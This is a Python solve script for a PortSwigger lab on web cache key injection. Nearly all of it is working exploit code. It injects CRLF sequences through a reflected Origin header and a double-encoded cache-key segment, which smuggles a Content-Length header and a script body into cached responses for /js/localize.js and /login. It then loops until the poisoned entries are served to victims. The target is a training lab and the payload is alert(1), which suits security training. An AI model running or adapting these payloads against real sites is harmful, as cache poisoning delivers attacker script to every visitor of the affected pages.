#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Cache key injection.

Chains two poisoned cache entries over HTTP/2:
  1. /js/localize.js with CRLF injection via reflected Origin header
  2. /login redirect with injected cache key matching the poisoned localize.js entry

Requires httpx with HTTP/2 support: pip install httpx[http2]
Both requests must use HTTP/2 and lowercase 'origin' header.
"""

import argparse
import time
import sys

try:
    import httpx
except ImportError:
    print("[-] Install httpx: pip install httpx[http2]")
    sys.exit(1)


CRLF = "%0d%0a"
CRLF2 = "%250d%250a"  # double-encoded for cache key injection


def build_localize_request(lab):
    url = f"{lab}/js/localize.js?lang=en?utm_content=z&cors=1&x=1"
    headers = {
        "pragma": "x-get-cache-key",
        # CRLF injection: reflected Origin injects Content-Length + alert(1) body
        "origin": f"x{CRLF}Content-Length:{CRLF} 8{CRLF}{CRLF}alert(1)$$$$",
    }
    return url, headers


def build_login_request(lab):
    # Double-encoded CRLF in cache key segment; %23 = # terminates the fragment
    url = (
        f"{lab}/login?lang=en?utm_content=x%26cors=1%26x=1"
        f"$$origin=x{CRLF2}Content-Length:{CRLF2} 8{CRLF2}{CRLF2}alert(1)$$%23"
    )
    headers = {"pragma": "x-get-cache-key"}
    return url, headers


def poison_until_hit(client, url, headers, label, max_attempts=20):
    for i in range(1, max_attempts + 1):
        r = client.get(url, headers=headers, follow_redirects=False)
        cache = r.headers.get("x-cache", "none")
        key = r.headers.get("x-cache-key", r.headers.get("x-get-cache-key", ""))
        print(f"[{i:3d}] {label}: X-Cache={cache}")
        if key:
            print(f"       key: {key[:120]}")
        if cache == "hit":
            print(f"[+] {label} poisoned!")
            return True
    return False


def main():
    parser = argparse.ArgumentParser(
        description="Solve Web Cache Poisoning Lab 12 (cache key injection)"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("--cycles", type=int, default=5, help="Poison cycles to run")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")

    with httpx.Client(http2=True, verify=False) as client:
        for cycle in range(1, args.cycles + 1):
            print(f"\n--- Cycle {cycle}/{args.cycles} ---")
            url1, h1 = build_localize_request(lab)
            poison_until_hit(client, url1, h1, "/js/localize.js", max_attempts=10)

            url2, h2 = build_login_request(lab)
            poison_until_hit(client, url2, h2, "/login", max_attempts=10)

            if cycle < args.cycles:
                time.sleep(25)

    print("\n[*] Done. Victim visits /login?lang=en -> redirect -> poisoned localize.js -> alert(1).")


if __name__ == "__main__":
    main()
